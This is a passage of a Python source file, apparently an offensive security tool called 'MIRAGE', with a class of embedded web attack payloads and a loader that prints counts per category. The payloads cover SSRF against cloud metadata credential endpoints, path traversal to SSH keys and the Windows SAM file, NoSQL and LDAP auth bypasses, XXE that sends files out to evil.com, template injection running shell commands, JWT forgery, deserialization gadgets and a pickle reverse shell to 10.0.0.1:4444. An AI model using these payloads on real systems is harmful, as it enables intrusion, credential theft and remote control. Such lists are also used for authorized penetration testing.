        "../../../home/user/.ssh/id_rsa",
        
        # Sensitive files - Windows
        "..\\..\\..\\windows\\system32\\config\\sam",
        "..\\..\\..\\windows\\system32\\config\\system",
        "..\\..\\..\\windows\\repair\\sam",
        "..\\..\\..\\windows\\debug\\NetSetup.log",
        "..\\..\\..\\inetpub\\logs\\LogFiles",
    ]
    
    # -------------------------------------------------------------------------
    # SSRF (50+ payloads)
    # -------------------------------------------------------------------------
    SSRF = [
        # Localhost variants
        "http://localhost/", "http://localhost:80/", "http://localhost:8080/admin",
        "http://127.0.0.1/", "http://127.0.0.1:22/", "http://127.0.0.1:3306/",
        "http://[::1]/", "http://[::1]:80/", "http://0.0.0.0/",
        "http://0/", "http://127.1/", "http://127.0.1/",
        
        # Decimal/Hex/Octal encoding
        "http://2130706433/", "http://0x7f000001/", "http://0177.0.0.1/",
        "http://0x7f.0x0.0x0.0x1/", "http://0177.0000.0000.0001/",
        
        # AWS metadata
        "http://169.254.169.254/", "http://169.254.169.254/latest/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        
        # GCP metadata
        "http://metadata.google.internal/", "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/",
        
        # Azure metadata
        "http://169.254.169.254/metadata/instance",
        "http://169.254.169.254/metadata/identity/oauth2/token",
        
        # DigitalOcean metadata
        "http://169.254.169.254/metadata/v1/",
        
        # Internal IPs
        "http://10.0.0.1/", "http://10.255.255.255/",
        "http://192.168.0.1/", "http://192.168.1.1/", "http://192.168.255.255/",
        "http://172.16.0.1/", "http://172.31.255.255/",
        
        # Alternative protocols
        "file:///etc/passwd", "file:///c:/windows/win.ini",
        "dict://localhost:11211/stats", "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_FLUSHALL",
        "gopher://127.0.0.1:3306/_",
        "gopher://127.0.0.1:25/_HELO%20localhost",
        "ldap://localhost:389/",
        "tftp://evil.com/shell.txt",
        
        # DNS rebinding
        "http://localtest.me/", "http://spoofed.burpcollaborator.net/",
        "http://127.0.0.1.xip.io/", "http://127.0.0.1.nip.io/",
    ]
    
    # -------------------------------------------------------------------------
    # NoSQL INJECTION (40+ payloads)
    # -------------------------------------------------------------------------
    NOSQL = [
        # MongoDB operators
        '{"$gt": ""}', '{"$ne": null}', '{"$ne": 1}', '{"$ne": ""}',
        '{"$regex": ".*"}', '{"$regex": "^a"}',
        '{"$where": "1==1"}', '{"$where": "this.password.length > 0"}',
        '{"$or": [{"a": 1}, {"b": 2}]}',
        '{"$and": [{"a": 1}, {"b": 2}]}',
        
        # Auth bypass
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
        '{"username": "admin", "password": {"$ne": ""}}',
        '{"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}',
        
        # Array/Parameter pollution
        'username[$ne]=admin&password[$ne]=admin',
        'username[$regex]=.*&password[$regex]=.*',
        'username[$gt]=&password[$gt]=',
        'username[$exists]=true&password[$exists]=true',
        'user[username]=admin&user[password][$ne]=',
        
        # NoSQL JavaScript injection
        "'; return true; var a='",
        '{"$where": "this.password.match(/.*/)"}',
        '{"$where": "function() { return true; }"}',
        '"; return this.password; var x="',
        "'; return db.users.find(); var x='",
        
        # MongoDB-specific
        '{"$type": 2}',
        '{"$size": 1}',
        '{"$elemMatch": {"$gt": 0}}',
        '{"$text": {"$search": "admin"}}',
    ]
    
    # -------------------------------------------------------------------------
    # XXE - XML External Entity (30+ payloads)
    # -------------------------------------------------------------------------
    XXE = [
        # Basic XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
        
        # Parameter entities
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?x=%file;\'>">%eval;%exfil;]>',
        
        # OOB (Out-of-Band)
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;%param1;]>',
        
        # Protocol handlers
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://localhost:6379/_FLUSHALL">]><foo>&xxe;</foo>',
        
        # Billion laughs (DoS)
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',
        
        # SSRF via XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/admin">]><foo>&xxe;</foo>',
        
        # XInclude
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    ]
    
    # -------------------------------------------------------------------------
    # SSTI - Server-Side Template Injection (40+ payloads)
    # -------------------------------------------------------------------------
    SSTI = [
        # Detection/probe
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{7*7}", "{{7*'7'}}",
        
        # Jinja2 (Python/Flask)
        "{{config}}", "{{self}}", "{{request}}", "{{g}}",
        "{{''.__class__}}", "{{''.__class__.__mro__}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
        
        # Twig (PHP)
        "{{_self}}", "{{_self.env}}", "{{_context}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        "{{app.request.server.get('DOCUMENT_ROOT')}}",
        
        # Freemarker (Java)
        "${7*7}", "<#assign x = 7*7>${x}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        
        # Velocity (Java)
        "#set($x=7*7)$x",
        "#set($str=$class.inspect(\"java.lang.String\").type)",
        "#set($rt=$str.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null))$rt.exec(\"id\")",
        
        # Smarty (PHP)
        "{$smarty.version}", "{php}echo `id`;{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
        
        # ERB (Ruby)
        "<%= 7*7 %>", "<%= `id` %>", "<%= system('id') %>",
        "<%= IO.popen('id').read() %>",
        
        # Mako (Python)
        "${7*7}", "<%import os; x=os.popen('id').read()%>${x}",
        
        # Pebble (Java)
        "{{ 7*7 }}", "{% set cmd = 'id' %}",
    ]
    
    # -------------------------------------------------------------------------
    # JWT ATTACKS (20+ payloads)
    # -------------------------------------------------------------------------
    JWT = [
        # alg:none
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.',
        'eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.',
        'eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.',
        'eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.',
        
        # Algorithm confusion RS256 -> HS256
        '{"alg":"HS256","typ":"JWT"}',
        
        # Key ID injection
        '{"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}',
        '{"alg":"HS256","typ":"JWT","kid":"key1|cat /etc/passwd"}',
        '{"alg":"HS256","typ":"JWT","kid":"key1; cat /etc/passwd"}',
        '{"alg":"HS256","typ":"JWT","kid":"/proc/self/environ"}',
        
        # JKU/X5U SSRF
        '{"alg":"RS256","typ":"JWT","jku":"http://evil.com/jwks.json"}',
        '{"alg":"RS256","typ":"JWT","x5u":"http://evil.com/cert.pem"}',
        
        # SQL injection in kid
        '{"alg":"HS256","typ":"JWT","kid":"key\' UNION SELECT \'secret\'--"}',
        
        # Expired token
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiZXhwIjoxfQ.fake',
    ]
    
    # -------------------------------------------------------------------------
    # GRAPHQL ATTACKS (20+ payloads)
    # -------------------------------------------------------------------------
    GRAPHQL = [
        # Introspection
        '{"query":"{__schema{types{name}}}"}',
        '{"query":"{__schema{queryType{name}}}"}',
        '{"query":"{__type(name:\\"User\\"){fields{name}}}"}',
        '{"query":"{__schema{types{name fields{name}}}}"}',
        '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}"}',
        
        # Deep nesting DoS
        '{"query":"{a{b{c{d{e{f{g{h{i{j}}}}}}}}}"}',
        
        # Batch attack
        '[{"query":"{user(id:1){name}}"},{"query":"{user(id:2){name}}"}]',
        
        # Alias attack
        '{"query":"{a:user(id:1){name}b:user(id:2){name}c:user(id:3){name}}"}',
        
        # Field duplication
        '{"query":"{user{name name name name name}}"}',
        
        # Directive overloading
        '{"query":"{user @include(if:true) @include(if:true){name}}"}',
    ]
    
    # -------------------------------------------------------------------------
    # PROTOTYPE POLLUTION (20+ payloads)
    # -------------------------------------------------------------------------
    PROTOTYPE_POLLUTION = [
        # JSON-based
        '{"__proto__": {"admin": true}}',
        '{"__proto__": {"isAdmin": true}}',
        '{"__proto__": {"polluted": true}}',
        '{"constructor": {"prototype": {"admin": true}}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        
        # Nested pollution
        '{"a": {"__proto__": {"b": true}}}',
        '{"a": {"constructor": {"prototype": {"b": true}}}}',
        
        # Query string
        '__proto__[admin]=1',
        '__proto__.admin=1',
        'constructor[prototype][admin]=1',
        'constructor.prototype.admin=1',
        '__proto__[isAdmin]=true',
        '__proto__[shell]=require("child_process").exec("id")',
        
        # Array pollution
        '{"__proto__": {"length": 1000000}}',
        '{"__proto__": {"0": "polluted"}}',
        
        # RCE via prototype pollution
        '{"__proto__": {"shell": "/proc/self/exe", "env": {"NODE_DEBUG": "child_process"}}}',
    ]
    
    # -------------------------------------------------------------------------
    # DESERIALIZATION (30+ payloads)
    # -------------------------------------------------------------------------
    DESERIALIZATION = [
        # Java serialized (base64)
        'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAMG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKkABQg7KLywIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADa2V5c3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeaqdAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDoLmVDyL1k5gIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArZnAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAAAAAAAAAdnIAE2phdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAABAAABdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABtzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3EAfgAbeHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVxAH4AIwAAAAB0AAZpbnZva2V1cQB+ACMAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAAAAAAAAAHZxAH4AI3NxAH4AHnVxAH4AIwAAAAF1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAABdAAFdG91Y2h0AARleGVjdXEAfgAjAAAAAXZxAH4AG3NxAH4AHnVxAH4AIwAAAAB0AARleGVjdXEAfgAjAAAAAXZxAH4AG3NyADFvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iqAAUIOyi8sCAAJMAAN',
        
        # PHP serialized
        'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
        'O:15:"SomeVulnClass":1:{s:3:"cmd";s:2:"id";}',
        'a:1:{s:4:"user";O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}}',
        'O:8:"__PHP_Incomplete_Class":1:{s:4:"name";s:6:"hacker";}',
        
        # Python pickle
        "cos\nsystem\n(S'id'\ntR.",
        "cposix\nsystem\n(S'/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\ntR.",
        "c__builtin__\neval\n(S'__import__(\"os\").system(\"id\")'\ntR.",
        
        # Node.js node-serialize
        '{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\")}()"}',
        
        # .NET BinaryFormatter
        'AAEAAAD/////AQAAAAAAAAAMAgAAAA==',
        
        # Ruby Marshal
        '\x04\bo:\vObject\x00',
    ]
    
    # -------------------------------------------------------------------------
    # LDAP INJECTION (20+ payloads)
    # -------------------------------------------------------------------------
    LDAP = [
        # Authentication bypass
        '*', '*)(uid=*))(|(uid=*', '*)(&', '*))%00',
        'admin)(&)', 'admin)(|(password=*))',
        '*)(objectClass=*', '*()|%26\'', '*)(uid=*))(',
        
        # OR injection
        '|(cn=*)', '|(uid=*)', '|(objectClass=*)',
        
        # AND injection
        '&(cn=*)', '&(uid=admin)',
        
        # Blind injection
        '*)(cn=a*', '*)(cn=b*', '*)(cn=admin*',
        
        # Null byte
        'admin)\x00', '*)\x00(&',
    ]
    
    # -------------------------------------------------------------------------
    # CRLF INJECTION (15+ payloads)
    # -------------------------------------------------------------------------
    CRLF = [
        # Header injection
        '%0d%0aSet-Cookie:hacked=1',
        '%0d%0aLocation:http://evil.com',
        '%0d%0aContent-Type:text/html',
        '%0d%0aX-Injected:header',
        '\r\nSet-Cookie:hacked=1',
        '\r\nLocation:http://evil.com',
        
        # Response splitting
        '%0d%0a%0d%0a<html>injected</html>',
        '\r\n\r\n<script>alert(1)</script>',
        '%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>Injected</html>',
        
        # Log injection
        'user%0d%0aINFO: Hacked%0d%0a',
        'test\r\nWARNING: Injected\r\n',
    ]
    
    # -------------------------------------------------------------------------
    # OPEN REDIRECT (20+ payloads)
    # -------------------------------------------------------------------------
    OPEN_REDIRECT = [
        # Basic
        'http://evil.com', 'https://evil.com', '//evil.com',
        '/\\evil.com', '///evil.com', '////evil.com',
        
        # Protocol-relative
        '//evil.com/%2f..', '/\\/evil.com',
        
        # Encoded
        '//evil%252ecom', 'https:%2f%2fevil.com',
        
        # With credentials
        'http://legit.com@evil.com', 'https://legit.com:password@evil.com/',
        
        # Backslash
        'http://evil.com\\@legit.com', '//evil.com\\legit.com',
        
        # Null byte
        '//evil.com%00.legit.com', 'http://evil.com%00legit.com',
        
        # Tab/newline
        '//evil%09.com', '//evil%0d.com', '//evil%0a.com',
        
        # JavaScript
        'javascript:alert(document.domain)//',
    ]
    
    @classmethod
    def get_all(cls) -> Dict[str, List[str]]:
        """Get all embedded payloads by category"""
        return {
            'sqli': cls.SQLI,
            'xss': cls.XSS,
            'rce': cls.RCE,
            'path_traversal': cls.PATH_TRAVERSAL,
            'ssrf': cls.SSRF,
            'nosql': cls.NOSQL,
            'xxe': cls.XXE,
            'ssti': cls.SSTI,
            'jwt': cls.JWT,
            'graphql': cls.GRAPHQL,
            'prototype_pollution': cls.PROTOTYPE_POLLUTION,
            'deserialization': cls.DESERIALIZATION,
            'ldap': cls.LDAP,
            'crlf': cls.CRLF,
            'open_redirect': cls.OPEN_REDIRECT,
        }
    
    @classmethod
    def get_category(cls, category: str) -> List[str]:
        """Get payloads for a specific category"""
        mapping = {
            'sqli': cls.SQLI,
            'xss': cls.XSS,
            'rce': cls.RCE,
            'path_traversal': cls.PATH_TRAVERSAL,
            'ssrf': cls.SSRF,
            'nosql': cls.NOSQL,
            'xxe': cls.XXE,
            'ssti': cls.SSTI,
            'jwt': cls.JWT,
            'graphql': cls.GRAPHQL,
            'prototype_pollution': cls.PROTOTYPE_POLLUTION,
            'deserialization': cls.DESERIALIZATION,
            'ldap': cls.LDAP,
            'crlf': cls.CRLF,
            'open_redirect': cls.OPEN_REDIRECT,
        }
        return mapping.get(category.lower(), [])
    
    @classmethod
    def get_total_count(cls) -> int:
        """Get total number of embedded payloads"""
        return sum(len(v) for v in cls.get_all().values())


# ============================================================================
# MAIN
# ============================================================================

if __name__ == '__main__':
    print("MIRAGE Real Payload Loader")
    print("=" * 60)
    
    loader = RealPayloadLoader()
    repos = loader.check_repositories()
    
    print("\nRepository Status:")
    for name, available in repos.items():
        status = "✓ Available" if available else "✗ Not found"
        print(f"  {name}: {status}")
    
    if any(repos.values()):
        print("\nLoading from repositories...")
        all_payloads = loader.load_all_categories(max_per_category=1000)
        
        print("\nLoaded Payloads:")
        for cat, payloads in all_payloads.items():
            print(f"  {cat}: {len(payloads)} payloads")
    else:
        print("\nUsing embedded payloads...")
        embedded = EmbeddedPayloads.get_all()
        
        print("\nEmbedded Payloads:")
        for cat, payloads in embedded.items():
            print(f"  {cat}: {len(payloads)} payloads")
